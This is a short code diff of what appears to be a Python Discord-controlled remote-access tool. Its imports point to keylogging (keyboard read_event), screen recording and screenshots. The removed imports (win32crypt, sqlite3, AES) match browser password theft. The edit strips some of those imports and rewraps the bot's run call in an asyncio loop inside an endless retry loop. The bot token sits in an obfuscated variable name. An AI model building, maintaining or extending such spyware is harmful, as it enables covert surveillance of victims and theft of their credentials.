@@ -3,12 +3,8 @@ import discord
 from discord.ext import commands
 import pyautogui
 import requests
-import base64
 import threading
 import os
-import json
-import sqlite3
-import win32crypt
 from Cryptodome.Cipher import AES
 from keyboard import read_event
 from subprocess import call
@@ -26,7 +22,8 @@ from PIL import Image
 import hashlib
 from discord.ext import commands
 from urllib.request import urlopen
-import re
+import asyncio
+
 recording = False
 record_thread = None
 filename = "screen_capture.mp4"
@@ -798,7 +795,9 @@ while True:
             '''
             for i in range(0, len(wiadomosc), 2000):
                 await ctx.send(wiadomosc[i:i+2000])
-        bot.run(hshfasudf)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.run(hshfasudf))
     except Exception as e:
         print(f"Error: {e}")
         sleep(5)
